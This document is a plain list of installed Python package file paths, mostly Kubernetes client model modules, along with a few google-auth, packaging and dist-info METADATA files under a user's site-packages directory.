/home/ubuntu/.local/lib/python3.10/site-packages/kubernetes/client/models/v1_condition.py
/home/ubuntu/.local/lib/python3.10/site-packages/kubernetes/client/models/v1_role.py
/home/ubuntu/.local/lib/python3.10/site-packages/kubernetes/client/models/v1beta2_device_allocation_result.py
/home/ubuntu/.local/lib/python3.10/site-packages/kubernetes/client/models/v1_csi_driver.py
/home/ubuntu/.local/lib/python3.10/site-packages/kubernetes/client/models/__init__.py
/home/ubuntu/.local/lib/python3.10/site-packages/kubernetes/client/models/v1_toleration.py
/home/ubuntu/.local/lib/python3.10/site-packages/kubernetes/client/models/v1_self_subject_rules_review_spec.py
/home/ubuntu/.local/lib/python3.10/site-packages/kubernetes/client/models/v1_flow_schema_status.py
/home/ubuntu/.local/lib/python3.10/site-packages/kubernetes/client/models/v1_exact_device_request.py
/home/ubuntu/.local/lib/python3.10/site-packages/kubernetes/client/models/v1_component_condition.py
/home/ubuntu/.local/lib/python3.10/site-packages/kubernetes/client/models/v1beta1_device_claim_configuration.py
/home/ubuntu/.local/lib/python3.10/site-packages/kubernetes/client/models/v1_stateful_set_condition.py
/home/ubuntu/.local/lib/python3.10/site-packages/kubernetes/client/models/v1_device_taint.py
/home/ubuntu/.local/lib/python3.10/site-packages/kubernetes/client/models/v1beta1_mutating_admission_policy_spec.py
/home/ubuntu/.local/lib/python3.10/site-packages/kubernetes/client/models/v1_endpoint_slice_list.py
/home/ubuntu/.local/lib/python3.10/site-packages/kubernetes/client/models/v1_overhead.py
/home/ubuntu/.local/lib/python3.10/site-packages/kubernetes/client/models/v1_device_counter_consumption.py
/home/ubuntu/.local/lib/python3.10/site-packages/kubernetes/client/models/v1beta1_device_class_spec.py
/home/ubuntu/.local/lib/python3.10/site-packages/kubernetes/client/models/v1_flex_volume_source.py
/home/ubuntu/.local/lib/python3.10/site-packages/kubernetes/client/models/v1beta1_lease_candidate_list.py
/home/ubuntu/.local/lib/python3.10/site-packages/kubernetes/client/models/v1_ip_address_spec.py
/home/ubuntu/.local/lib/python3.10/site-packages/kubernetes/client/models/v1alpha1_volume_attributes_class_list.py
/home/ubuntu/.local/lib/python3.10/site-packages/kubernetes/client/models/v1_role_list.py
/home/ubuntu/.local/lib/python3.10/site-packages/kubernetes/client/models/v1_ip_address_list.py
/home/ubuntu/.local/lib/python3.10/site-packages/kubernetes/client/models/v1alpha1_storage_version_migration.py
/home/ubuntu/.local/lib/python3.10/site-packages/kubernetes/client/models/v1_allocated_device_status.py
/home/ubuntu/.local/lib/python3.10/site-packages/kubernetes/client/models/v1_device_attribute.py
/home/ubuntu/.local/lib/python3.10/site-packages/kubernetes/client/models/v1_type_checking.py
/home/ubuntu/.local/lib/python3.10/site-packages/kubernetes/client/models/v1beta2_exact_device_request.py
/home/ubuntu/.local/lib/python3.10/site-packages/kubernetes/client/models/v1beta1_device_toleration.py
/home/ubuntu/.local/lib/python3.10/site-packages/kubernetes/client/models/v1beta2_counter.py
/home/ubuntu/.local/lib/python3.10/site-packages/kubernetes/client/models/v1_ephemeral_container.py
/home/ubuntu/.local/lib/python3.10/site-packages/kubernetes/client/models/v1_resource_pool.py
/home/ubuntu/.local/lib/python3.10/site-packages/kubernetes/client/models/v1_storage_class.py
/home/ubuntu/.local/lib/python3.10/site-packages/kubernetes/client/models/v1beta1_capacity_request_policy_range.py
/home/ubuntu/.local/lib/python3.10/site-packages/kubernetes/client/models/v1_topology_selector_term.py
/home/ubuntu/.local/lib/python3.10/site-packages/kubernetes/client/models/v1beta2_resource_slice_list.py
/home/ubuntu/.local/lib/python3.10/site-packages/kubernetes/client/models/v1beta1_mutating_admission_policy_binding_list.py
/home/ubuntu/.local/lib/python3.10/site-packages/kubernetes/client/models/v1alpha3_device_taint_selector.py
/home/ubuntu/.local/lib/python3.10/site-packages/kubernetes/client/models/v1_job_spec.py
/home/ubuntu/.local/lib/python3.10/site-packages/kubernetes/client/models/v1_cel_device_selector.py
/home/ubuntu/.local/lib/python3.10/site-packages/kubernetes/client/models/v2_container_resource_metric_status.py
/home/ubuntu/.local/lib/python3.10/site-packages/kubernetes/client/models/apiextensions_v1_service_reference.py
/home/ubuntu/.local/lib/python3.10/site-packages/kubernetes/client/models/v1beta1_device_request.py
/home/ubuntu/.local/lib/python3.10/site-packages/kubernetes/client/models/v1_ingress.py
/home/ubuntu/.local/lib/python3.10/site-packages/kubernetes/client/models/v1_container_state_running.py
/home/ubuntu/.local/lib/python3.10/site-packages/kubernetes/client/models/v1_cross_version_object_reference.py
/home/ubuntu/.local/lib/python3.10/site-packages/kubernetes/client/models/v1_certificate_signing_request_condition.py
/home/ubuntu/.local/lib/python3.10/site-packages/kubernetes/client/models/v1alpha1_param_ref.py
/home/ubuntu/.local/lib/python3.10/site-packages/kubernetes/client/models/v1_cluster_role_binding.py
/home/ubuntu/.local/lib/python3.10/site-packages/kubernetes/client/models/v1alpha1_cluster_trust_bundle_list.py
/home/ubuntu/.local/lib/python3.10/site-packages/kubernetes/client/models/v1_client_ip_config.py
/home/ubuntu/.local/lib/python3.10/site-packages/kubernetes/client/models/v1_iscsi_persistent_volume_source.py
/home/ubuntu/.local/lib/python3.10/site-packages/kubernetes/client/models/v1beta1_cluster_trust_bundle_list.py
/home/ubuntu/.local/lib/python3.10/site-packages/kubernetes/client/models/v1beta1_device_allocation_result.py
/home/ubuntu/.local/lib/python3.10/site-packages/kubernetes/client/models/v1_ip_address.py
/home/ubuntu/.local/lib/python3.10/site-packages/kubernetes/client/models/v1beta2_device_constraint.py
/home/ubuntu/.local/lib/python3.10/site-packages/kubernetes/client/models/v1_persistent_volume_claim_list.py
/home/ubuntu/.local/lib/python3.10/site-packages/kubernetes/client/models/v1_limited_priority_level_configuration.py
/home/ubuntu/.local/lib/python3.10/site-packages/kubernetes/client/models/v1beta1_device_claim.py
/home/ubuntu/.local/lib/python3.10/site-packages/kubernetes/client/models/v1_validating_webhook_configuration.py
/home/ubuntu/.local/lib/python3.10/site-packages/kubernetes/client/models/v1beta2_device_claim.py
/home/ubuntu/.local/lib/python3.10/site-packages/kubernetes/client/models/v1_device_request_allocation_result.py
/home/ubuntu/.local/lib/python3.10/site-packages/kubernetes/client/models/v1_network_policy_port.py
/home/ubuntu/.local/lib/python3.10/site-packages/kubernetes/client/models/v1_csi_storage_capacity_list.py
/home/ubuntu/.local/lib/python3.10/site-packages/kubernetes/client/models/v1_network_policy_peer.py
/home/ubuntu/.local/lib/python3.10/site-packages/kubernetes/client/models/v1_service_status.py
/home/ubuntu/.local/lib/python3.10/site-packages/kubernetes/client/models/v1_downward_api_volume_file.py
/home/ubuntu/.local/lib/python3.10/site-packages/kubernetes/client/models/v1_volume_device.py
/home/ubuntu/.local/lib/python3.10/site-packages/kubernetes/client/models/v1_downward_api_volume_source.py
/home/ubuntu/.local/lib/python3.10/site-packages/kubernetes/client/models/v1_resource_slice.py
/home/ubuntu/.local/lib/python3.10/site-packages/kubernetes/client/models/authentication_v1_token_request.py
/home/ubuntu/.local/lib/python3.10/site-packages/kubernetes/client/models/v1_api_service_status.py
/home/ubuntu/.local/lib/python3.10/site-packages/kubernetes/client/models/v1_endpoints.py
/home/ubuntu/.local/lib/python3.10/site-packages/kubernetes/client/models/v1beta1_service_cidr.py
/home/ubuntu/.local/lib/python3.10/site-packages/kubernetes/client/models/v1_host_ip.py
/home/ubuntu/.local/lib/python3.10/site-packages/kubernetes/client/models/v1_load_balancer_status.py
/home/ubuntu/.local/lib/python3.10/site-packages/kubernetes/client/models/v2_resource_metric_status.py
/home/ubuntu/.local/lib/python3.10/site-packages/kubernetes/client/models/v1alpha1_pod_certificate_request_list.py
/home/ubuntu/.local/lib/python3.10/site-packages/kubernetes/client/models/v1_namespace_list.py
/home/ubuntu/.local/lib/python3.10/site-packages/kubernetes/client/models/v1_device_sub_request.py
/home/ubuntu/.local/lib/python3.10/site-packages/kubernetes/client/models/rbac_v1_subject.py
/home/ubuntu/.local/lib/python3.10/site-packages/kubernetes/client/models/v1_binding.py
/home/ubuntu/.local/lib/python3.10/site-packages/kubernetes/client/models/v1beta1_ip_address.py
/home/ubuntu/.local/lib/python3.10/site-packages/kubernetes/client/models/v1_storage_class_list.py
/home/ubuntu/.local/lib/python3.10/site-packages/kubernetes/client/models/v1_modify_volume_status.py
/home/ubuntu/.local/lib/python3.10/site-packages/kubernetes/client/models/v1_flow_schema_condition.py
/home/ubuntu/.local/lib/python3.10/site-packages/kubernetes/client/models/v1beta2_resource_claim_status.py
/home/ubuntu/.local/lib/python3.10/site-packages/kubernetes/client/models/v1_group_version_for_discovery.py
/home/ubuntu/.local/lib/python3.10/site-packages/kubernetes/client/models/flowcontrol_v1_subject.py
/home/ubuntu/.local/lib/python3.10/site-packages/kubernetes/client/models/v1beta2_device_class_list.py
/home/ubuntu/.local/lib/python3.10/site-packages/kubernetes/client/models/v1_custom_resource_column_definition.py
/home/ubuntu/.local/lib/python3.10/site-packages/kubernetes/client/models/v1_lifecycle.py
/home/ubuntu/.local/lib/python3.10/site-packages/kubernetes/client/models/v1_scale_status.py
/home/ubuntu/.local/lib/python3.10/site-packages/kubernetes/client/models/v1beta2_counter_set.py
/home/ubuntu/.local/lib/python3.10/site-packages/kubernetes/client/models/v1beta1_service_cidr_spec.py
/home/ubuntu/.local/lib/python3.10/site-packages/kubernetes/client/models/v1_lease_spec.py
/home/ubuntu/.local/lib/python3.10/site-packages/kubernetes/client/models/v1_container_extended_resource_request.py
/home/ubuntu/.local/lib/python3.10/site-packages/kubernetes/client/models/v1_api_versions.py
/home/ubuntu/.local/lib/python3.10/site-packages/kubernetes/client/models/v1_server_address_by_client_cidr.py
/home/ubuntu/.local/lib/python3.10/site-packages/kubernetes/client/models/v1_volume_mount_status.py
/home/ubuntu/.local/lib/python3.10/site-packages/kubernetes/client/models/v2_external_metric_status.py
/home/ubuntu/.local/lib/python3.10/site-packages/kubernetes/client/models/v1_status_cause.py
/home/ubuntu/.local/lib/python3.10/site-packages/kubernetes/client/models/v1beta2_resource_claim_template.py
/home/ubuntu/.local/lib/python3.10/site-packages/kubernetes/client/models/v1_volume_attributes_class_list.py
/home/ubuntu/.local/lib/python3.10/site-packages/kubernetes/client/models/v1_group_subject.py
/home/ubuntu/.local/lib/python3.10/site-packages/kubernetes/client/models/v1_api_service_spec.py
/home/ubuntu/.local/lib/python3.10/site-packages/kubernetes/client/models/v1_resource_quota.py
/home/ubuntu/.local/lib/python3.10/site-packages/kubernetes/client/models/v1_volume_resource_requirements.py
/home/ubuntu/.local/lib/python3.10/site-packages/kubernetes/client/models/v1_priority_level_configuration_status.py
/home/ubuntu/.local/lib/python3.10/site-packages/kubernetes/client/models/v1_topology_spread_constraint.py
/home/ubuntu/.local/lib/python3.10/site-packages/kubernetes/client/models/v1_delete_options.py
/home/ubuntu/.local/lib/python3.10/site-packages/kubernetes/client/models/v1beta2_device_class_configuration.py
/home/ubuntu/.local/lib/python3.10/site-packages/kubernetes/client/models/v1beta1_apply_configuration.py
/home/ubuntu/.local/lib/python3.10/site-packages/kubernetes/client/models/v1_pod_failure_policy_on_exit_codes_requirement.py
/home/ubuntu/.local/lib/python3.10/site-packages/kubernetes/client/models/v1_ingress_spec.py
/home/ubuntu/.local/lib/python3.10/site-packages/kubernetes/client/models/v1_container_port.py
/home/ubuntu/.local/lib/python3.10/site-packages/kubernetes/client/models/v1_node_selector_term.py
/home/ubuntu/.local/lib/python3.10/site-packages/kubernetes/client/models/v1_container_state_terminated.py
/home/ubuntu/.local/lib/python3.10/site-packages/kubernetes/client/models/v1beta1_device_request_allocation_result.py
/home/ubuntu/.local/lib/python3.10/site-packages/kubernetes/client/models/v1_secret_projection.py
/home/ubuntu/.local/lib/python3.10/site-packages/kubernetes/client/models/v1_device_constraint.py
/home/ubuntu/.local/lib/python3.10/site-packages/kubernetes/client/models/v1alpha1_storage_version_migration_status.py
/home/ubuntu/.local/lib/python3.10/site-packages/kubernetes/client/models/v1_validating_admission_policy_spec.py
/home/ubuntu/.local/lib/python3.10/site-packages/kubernetes/client/models/v1_eviction.py
/home/ubuntu/.local/lib/python3.10/site-packages/kubernetes/client/models/v1_pod_disruption_budget_spec.py
/home/ubuntu/.local/lib/python3.10/site-packages/kubernetes/client/models/v1_for_zone.py
/home/ubuntu/.local/lib/python3.10/site-packages/kubernetes/client/models/v1beta2_device_class_spec.py
/home/ubuntu/.local/lib/python3.10/site-packages/kubernetes/client/models/v1_volume_attachment_status.py
/home/ubuntu/.local/lib/python3.10/site-packages/kubernetes/client/models/v1alpha1_migration_condition.py
/home/ubuntu/.local/lib/python3.10/site-packages/kubernetes/client/models/v1beta1_resource_slice_list.py
/home/ubuntu/.local/lib/python3.10/site-packages/kubernetes/client/models/v1_cinder_persistent_volume_source.py
/home/ubuntu/.local/lib/python3.10/site-packages/kubernetes/client/models/v1_replica_set_spec.py
/home/ubuntu/.local/lib/python3.10/site-packages/kubernetes/client/models/v1_limit_response.py
/home/ubuntu/.local/lib/python3.10/site-packages/kubernetes/client/models/v1_node_list.py
/home/ubuntu/.local/lib/python3.10/site-packages/kubernetes/client/models/v1_deployment.py
/home/ubuntu/.local/lib/python3.10/site-packages/kubernetes/client/models/v1beta1_ip_address_spec.py
/home/ubuntu/.local/lib/python3.10/site-packages/kubernetes/client/models/v1_self_subject_review_status.py
/home/ubuntu/.local/lib/python3.10/site-packages/kubernetes/client/models/v1alpha1_storage_version_migration_spec.py
/home/ubuntu/.local/lib/python3.10/site-packages/kubernetes/client/models/v1_mutating_webhook_configuration_list.py
/home/ubuntu/.local/lib/python3.10/site-packages/kubernetes/client/models/v1_secret_reference.py
/home/ubuntu/.local/lib/python3.10/site-packages/kubernetes/client/models/v1beta2_opaque_device_configuration.py
/home/ubuntu/.local/lib/python3.10/site-packages/kubernetes/client/models/v2_cross_version_object_reference.py
/home/ubuntu/.local/lib/python3.10/site-packages/kubernetes/client/models/v1_aws_elastic_block_store_volume_source.py
/home/ubuntu/.local/lib/python3.10/site-packages/kubernetes/client/models/storage_v1_token_request.py
/home/ubuntu/.local/lib/python3.10/site-packages/kubernetes/client/models/v1beta1_mutating_admission_policy_binding_spec.py
/home/ubuntu/.local/lib/python3.10/site-packages/kubernetes/client/models/v1_endpoint.py
/home/ubuntu/.local/lib/python3.10/site-packages/kubernetes/client/models/v1_endpoint_subset.py
/home/ubuntu/.local/lib/python3.10/site-packages/kubernetes/client/models/v1_weighted_pod_affinity_term.py
/home/ubuntu/.local/lib/python3.10/site-packages/kubernetes/client/models/v1_external_documentation.py
/home/ubuntu/.local/lib/python3.10/site-packages/kubernetes/client/models/v1_persistent_volume_claim.py
/home/ubuntu/.local/lib/python3.10/site-packages/kubernetes/client/models/v1_stateful_set_persistent_volume_claim_retention_policy.py
/home/ubuntu/.local/lib/python3.10/site-packages/kubernetes/client/models/resource_v1_resource_claim.py
/home/ubuntu/.local/lib/python3.10/site-packages/kubernetes/client/models/v1_deployment_status.py
/home/ubuntu/.local/lib/python3.10/site-packages/kubernetes/client/models/v1_runtime_class_list.py
/home/ubuntu/.local/lib/python3.10/site-packages/kubernetes/client/models/v1alpha3_device_taint_rule_list.py
/home/ubuntu/.local/lib/python3.10/site-packages/kubernetes/client/models/v1_service_port.py
/home/ubuntu/.local/lib/python3.10/site-packages/kubernetes/client/models/v1_node_condition.py
/home/ubuntu/.local/lib/python3.10/site-packages/kubernetes/client/models/v1_typed_local_object_reference.py
/home/ubuntu/.local/lib/python3.10/site-packages/kubernetes/client/models/v1_probe.py
/home/ubuntu/.local/lib/python3.10/site-packages/kubernetes/client/models/v1_bound_object_reference.py
/home/ubuntu/.local/lib/python3.10/site-packages/kubernetes/client/models/v1beta2_device_counter_consumption.py
/home/ubuntu/.local/lib/python3.10/site-packages/kubernetes/client/models/v1_custom_resource_definition_names.py
/home/ubuntu/.local/lib/python3.10/site-packages/kubernetes/client/models/v1_git_repo_volume_source.py
/home/ubuntu/.local/lib/python3.10/site-packages/kubernetes/client/models/v1_pod.py
/home/ubuntu/.local/lib/python3.10/site-packages/kubernetes/client/models/v1_status_details.py
/home/ubuntu/.local/lib/python3.10/site-packages/kubernetes/client/models/v1_node_features.py
/home/ubuntu/.local/lib/python3.10/site-packages/kubernetes/client/models/v1_replica_set_status.py
/home/ubuntu/.local/lib/python3.10/site-packages/kubernetes/client/models/v1_device_class_configuration.py
/home/ubuntu/.local/lib/python3.10/site-packages/kubernetes/client/models/version_info.py
/home/ubuntu/.local/lib/python3.10/site-packages/kubernetes/client/models/v1_resource_quota_list.py
/home/ubuntu/.local/lib/python3.10/site-packages/kubernetes/client/models/v1_counter_set.py
/home/ubuntu/.local/lib/python3.10/site-packages/kubernetes/client/models/v1_flow_schema_spec.py
/home/ubuntu/.local/lib/python3.10/site-packages/kubernetes/client/models/v1beta1_resource_claim_consumer_reference.py
/home/ubuntu/.local/lib/python3.10/site-packages/kubernetes/client/models/v1_scale_spec.py
/home/ubuntu/.local/lib/python3.10/site-packages/kubernetes/client/models/v1_capabilities.py
/home/ubuntu/.local/lib/python3.10/site-packages/kubernetes/client/models/v1_gce_persistent_disk_volume_source.py
/home/ubuntu/.local/lib/python3.10/site-packages/kubernetes/client/models/v1_token_review.py
/home/ubuntu/.local/lib/python3.10/site-packages/kubernetes/client/models/v1_pod_extended_resource_claim_status.py
/home/ubuntu/.local/lib/python3.10/site-packages/kubernetes/client/models/v1_horizontal_pod_autoscaler_list.py
/home/ubuntu/.local/lib/python3.10/site-packages/kubernetes/client/models/v2_horizontal_pod_autoscaler.py
/home/ubuntu/.local/lib/python3.10/site-packages/kubernetes/client/models/v1_object_field_selector.py
/home/ubuntu/.local/lib/python3.10/site-packages/kubernetes/client/models/v1beta1_param_kind.py
/home/ubuntu/.local/lib/python3.10/site-packages/kubernetes/client/models/v1_api_service_list.py
/home/ubuntu/.local/lib/python3.10/site-packages/kubernetes/client/models/v1beta1_mutating_admission_policy_binding.py
/home/ubuntu/.local/lib/python3.10/site-packages/kubernetes/client/models/v1_capacity_request_policy_range.py
/home/ubuntu/.local/lib/python3.10/site-packages/kubernetes/client/models/v1_config_map_list.py
/home/ubuntu/.local/lib/python3.10/site-packages/kubernetes/client/models/v1_csi_driver_list.py
/home/ubuntu/.local/lib/python3.10/site-packages/kubernetes/client/models/v1beta2_capacity_request_policy_range.py
/home/ubuntu/.local/lib/python3.10/site-packages/kubernetes/client/models/v1alpha1_json_patch.py
/home/ubuntu/.local/lib/python3.10/site-packages/kubernetes/client/models/v1_self_subject_access_review_spec.py
/home/ubuntu/.local/lib/python3.10/site-packages/kubernetes/client/models/v1_storage_os_volume_source.py
/home/ubuntu/.local/lib/python3.10/site-packages/kubernetes/client/models/v1_cron_job_spec.py
/home/ubuntu/.local/lib/python3.10/site-packages/kubernetes/client/models/v1beta1_lease_candidate_spec.py
/home/ubuntu/.local/lib/python3.10/site-packages/kubernetes/client/models/v1_pod_resource_claim_status.py
/home/ubuntu/.local/lib/python3.10/site-packages/kubernetes/client/models/v1_service_cidr.py
/home/ubuntu/.local/lib/python3.10/site-packages/kubernetes/client/models/v1_api_resource_list.py
/home/ubuntu/.local/lib/python3.10/site-packages/kubernetes/client/models/v1_custom_resource_definition_condition.py
/home/ubuntu/.local/lib/python3.10/site-packages/kubernetes/client/models/v1beta2_capacity_requirements.py
/home/ubuntu/.local/lib/python3.10/site-packages/kubernetes/client/models/v1alpha1_mutating_admission_policy_binding.py
/home/ubuntu/.local/lib/python3.10/site-packages/kubernetes/client/models/v1_resource_requirements.py
/home/ubuntu/.local/lib/python3.10/site-packages/kubernetes/client/models/v2_horizontal_pod_autoscaler_behavior.py
/home/ubuntu/.local/lib/python3.10/site-packages/kubernetes/client/models/v1_secret_key_selector.py
/home/ubuntu/.local/lib/python3.10/site-packages/kubernetes/client/models/v1beta1_lease_candidate.py
/home/ubuntu/.local/lib/python3.10/site-packages/kubernetes/client/models/v1_ip_block.py
/home/ubuntu/.local/lib/python3.10/site-packages/kubernetes/client/models/v1_replica_set.py
/home/ubuntu/.local/lib/python3.10/site-packages/kubernetes/client/models/v1_grpc_action.py
/home/ubuntu/.local/lib/python3.10/site-packages/kubernetes/client/models/v1_success_policy_rule.py
/home/ubuntu/.local/lib/python3.10/site-packages/kubernetes/client/models/v1_capacity_request_policy.py
/home/ubuntu/.local/lib/python3.10/site-packages/kubernetes/client/models/v1_resource_claim_template_list.py
/home/ubuntu/.local/lib/python3.10/site-packages/kubernetes/client/models/v1_non_resource_attributes.py
/home/ubuntu/.local/lib/python3.10/site-packages/kubernetes/client/models/v1_subject_rules_review_status.py
/home/ubuntu/.local/lib/python3.10/site-packages/kubernetes/client/models/core_v1_endpoint_port.py
/home/ubuntu/.local/lib/python3.10/site-packages/kubernetes/client/models/v1beta1_cluster_trust_bundle.py
/home/ubuntu/.local/lib/python3.10/site-packages/kubernetes/client/models/v1alpha1_storage_version_migration_list.py
/home/ubuntu/.local/lib/python3.10/site-packages/kubernetes/client/models/v1_namespace_status.py
/home/ubuntu/.local/lib/python3.10/site-packages/kubernetes/client/models/v1_service_account_subject.py
/home/ubuntu/.local/lib/python3.10/site-packages/kubernetes/client/models/v1_object_meta.py
/home/ubuntu/.local/lib/python3.10/site-packages/kubernetes/client/models/v1_sysctl.py
/home/ubuntu/.local/lib/python3.10/site-packages/kubernetes/client/models/v1_taint.py
/home/ubuntu/.local/lib/python3.10/site-packages/kubernetes/client/models/v1beta1_resource_claim_list.py
/home/ubuntu/.local/lib/python3.10/site-packages/kubernetes/client/models/v1_service_account.py
/home/ubuntu/.local/lib/python3.10/site-packages/kubernetes/client/models/v1_aggregation_rule.py
/home/ubuntu/.local/lib/python3.10/site-packages/kubernetes/client/models/v1_resource_slice_spec.py
/home/ubuntu/.local/lib/python3.10/site-packages/kubernetes/client/models/v1alpha1_match_condition.py
/home/ubuntu/.local/lib/python3.10/site-packages/kubernetes/client/models/v1_resource_claim_spec.py
/home/ubuntu/.local/lib/python3.10/site-packages/kubernetes/client/models/v1_ingress_service_backend.py
/home/ubuntu/.local/lib/python3.10/site-packages/kubernetes/client/models/v1_managed_fields_entry.py
/home/ubuntu/.local/lib/python3.10/site-packages/kubernetes/client/models/v1_service_backend_port.py
/home/ubuntu/.local/lib/python3.10/site-packages/kubernetes/client/models/v1_event_source.py
/home/ubuntu/.local/lib/python3.10/site-packages/kubernetes/client/models/v1beta1_device_capacity.py
/home/ubuntu/.local/lib/python3.10/site-packages/kubernetes/client/models/v1beta1_param_ref.py
/home/ubuntu/.local/lib/python3.10/site-packages/kubernetes/client/models/v2_object_metric_source.py
/home/ubuntu/.local/lib/python3.10/site-packages/kubernetes/client/models/v1_resource_claim_template.py
/home/ubuntu/.local/lib/python3.10/site-packages/kubernetes/client/models/v1_volume_attachment_source.py
/home/ubuntu/.local/lib/python3.10/site-packages/kubernetes/client/models/v1_device_allocation_configuration.py
/home/ubuntu/.local/lib/python3.10/site-packages/kubernetes/client/models/v1_param_ref.py
/home/ubuntu/.local/lib/python3.10/site-packages/kubernetes/client/models/v1beta1_device_class.py
/home/ubuntu/.local/lib/python3.10/site-packages/kubernetes/client/models/v1_ingress_port_status.py
/home/ubuntu/.local/lib/python3.10/site-packages/kubernetes/client/models/v1_rule_with_operations.py
/home/ubuntu/.local/lib/python3.10/site-packages/kubernetes/client/models/v1_deployment_strategy.py
/home/ubuntu/.local/lib/python3.10/site-packages/kubernetes/client/models/v1_csi_persistent_volume_source.py
/home/ubuntu/.local/lib/python3.10/site-packages/kubernetes/client/models/v1_pod_failure_policy.py
/home/ubuntu/.local/lib/python3.10/site-packages/kubernetes/client/models/v1_ingress_rule.py
/home/ubuntu/.local/lib/python3.10/site-packages/kubernetes/client/models/v1_lease_list.py
/home/ubuntu/.local/lib/python3.10/site-packages/kubernetes/client/models/v1_secret_volume_source.py
/home/ubuntu/.local/lib/python3.10/site-packages/kubernetes/client/models/v1_lifecycle_handler.py
/home/ubuntu/.local/lib/python3.10/site-packages/kubernetes/client/models/v1_rolling_update_daemon_set.py
/home/ubuntu/.local/lib/python3.10/site-packages/kubernetes/client/models/v1alpha1_mutating_admission_policy_binding_list.py
/home/ubuntu/.local/lib/python3.10/site-packages/kubernetes/client/models/v1_daemon_set_update_strategy.py
/home/ubuntu/.local/lib/python3.10/site-packages/kubernetes/client/models/v1_validating_admission_policy_binding_list.py
/home/ubuntu/.local/lib/python3.10/site-packages/kubernetes/client/models/v1_allocation_result.py
/home/ubuntu/.local/lib/python3.10/site-packages/kubernetes/client/models/v1_pod_status.py
/home/ubuntu/.local/lib/python3.10/site-packages/kubernetes/client/models/v1beta1_resource_claim_template.py
/home/ubuntu/.local/lib/python3.10/site-packages/kubernetes/client/models/v1alpha1_pod_certificate_request_spec.py
/home/ubuntu/.local/lib/python3.10/site-packages/kubernetes/client/models/v1_job_condition.py
/home/ubuntu/.local/lib/python3.10/site-packages/kubernetes/client/models/v2_metric_spec.py
/home/ubuntu/.local/lib/python3.10/site-packages/kubernetes/client/models/v1_named_rule_with_operations.py
/home/ubuntu/.local/lib/python3.10/site-packages/kubernetes/client/models/v1beta1_device_allocation_configuration.py
/home/ubuntu/.local/lib/python3.10/site-packages/kubernetes/client/models/v1_runtime_class.py
/home/ubuntu/.local/lib/python3.10/site-packages/kubernetes/client/models/v1_container_state.py
/home/ubuntu/.local/lib/python3.10/site-packages/kubernetes/client/models/v1beta2_cel_device_selector.py
/home/ubuntu/.local/lib/python3.10/site-packages/kubernetes/client/models/v1_photon_persistent_disk_volume_source.py
/home/ubuntu/.local/lib/python3.10/site-packages/kubernetes/client/models/v1_storage_os_persistent_volume_source.py
/home/ubuntu/.local/lib/python3.10/site-packages/kubernetes/client/models/v1beta2_resource_claim_list.py
/home/ubuntu/.local/lib/python3.10/site-packages/kubernetes/client/models/apiextensions_v1_webhook_client_config.py
/home/ubuntu/.local/lib/python3.10/site-packages/kubernetes/client/models/v1_token_review_status.py
/home/ubuntu/.local/lib/python3.10/site-packages/kubernetes/client/models/v1_service_cidr_status.py
/home/ubuntu/.local/lib/python3.10/site-packages/kubernetes/client/models/v1_local_subject_access_review.py
/home/ubuntu/.local/lib/python3.10/site-packages/kubernetes/client/models/v1_glusterfs_volume_source.py
/home/ubuntu/.local/lib/python3.10/site-packages/kubernetes/client/models/v1_namespace.py
/home/ubuntu/.local/lib/python3.10/site-packages/kubernetes/client/models/v1_preferred_scheduling_term.py
/home/ubuntu/.local/lib/python3.10/site-packages/kubernetes/client/models/v1_mutating_webhook.py
/home/ubuntu/.local/lib/python3.10/site-packages/kubernetes/client/models/v1beta1_cluster_trust_bundle_spec.py
/home/ubuntu/.local/lib/python3.10/site-packages/kubernetes/client/models/v1_pod_readiness_gate.py
/home/ubuntu/.local/lib/python3.10/site-packages/kubernetes/client/models/v1_volume_node_resources.py
/home/ubuntu/.local/lib/python3.10/site-packages/kubernetes/client/models/v1_empty_dir_volume_source.py
/home/ubuntu/.local/lib/python3.10/site-packages/kubernetes/client/models/v1_role_binding_list.py
/home/ubuntu/.local/lib/python3.10/site-packages/kubernetes/client/models/v1_daemon_endpoint.py
/home/ubuntu/.local/lib/python3.10/site-packages/kubernetes/client/models/admissionregistration_v1_webhook_client_config.py
/home/ubuntu/.local/lib/python3.10/site-packages/kubernetes/client/models/core_v1_resource_claim.py
/home/ubuntu/.local/lib/python3.10/site-packages/kubernetes/client/models/v1_config_map.py
/home/ubuntu/.local/lib/python3.10/site-packages/kubernetes/client/models/v1_validating_admission_policy_list.py
/home/ubuntu/.local/lib/python3.10/site-packages/kubernetes/client/models/v1beta1_volume_attributes_class.py
/home/ubuntu/.local/lib/python3.10/site-packages/kubernetes/client/models/v1_windows_security_context_options.py
/home/ubuntu/.local/lib/python3.10/site-packages/kubernetes/client/models/v1beta2_resource_claim_consumer_reference.py
/home/ubuntu/.local/lib/python3.10/site-packages/kubernetes/client/models/v1_resource_slice_list.py
/home/ubuntu/.local/lib/python3.10/site-packages/kubernetes/client/models/v2_horizontal_pod_autoscaler_list.py
/home/ubuntu/.local/lib/python3.10/site-packages/kubernetes/client/models/v1_exec_action.py
/home/ubuntu/.local/lib/python3.10/site-packages/kubernetes/client/models/v1_role_ref.py
/home/ubuntu/.local/lib/python3.10/site-packages/kubernetes/client/models/v1beta1_resource_claim.py
/home/ubuntu/.local/lib/python3.10/site-packages/kubernetes/client/exceptions.py
/home/ubuntu/.local/lib/python3.10/site-packages/kubernetes/dynamic/exceptions.py
/home/ubuntu/.local/lib/python3.10/site-packages/kubernetes-34.1.0.dist-info/METADATA
/home/ubuntu/.local/lib/python3.10/site-packages/websocket_client-1.9.0.dist-info/METADATA
/home/ubuntu/.local/lib/python3.10/site-packages/google/auth/_helpers.py
/home/ubuntu/.local/lib/python3.10/site-packages/google/auth/aws.py
/home/ubuntu/.local/lib/python3.10/site-packages/google/auth/transport/_custom_tls_signer.py
/home/ubuntu/.local/lib/python3.10/site-packages/google/auth/transport/urllib3.py
/home/ubuntu/.local/lib/python3.10/site-packages/google/auth/transport/_mtls_helper.py
/home/ubuntu/.local/lib/python3.10/site-packages/google/auth/_cloud_sdk.py
/home/ubuntu/.local/lib/python3.10/site-packages/google/auth/aio/_helpers.py
/home/ubuntu/.local/lib/python3.10/site-packages/google/auth/aio/transport/sessions.py
/home/ubuntu/.local/lib/python3.10/site-packages/exceptiongroup-1.3.1.dist-info/METADATA
/home/ubuntu/.local/lib/python3.10/site-packages/packaging/tags.py
/home/ubuntu/.local/lib/python3.10/site-packages/packaging/_manylinux.py
/home/ubuntu/.local/lib/python3.10/site-packages/packaging/licenses/__init__.py
/home/ubuntu/.local/lib/python3.10/site-packages/packaging/__init__.py
/home/ubuntu/.local/lib/python3.10/site-packages/packaging/version.py
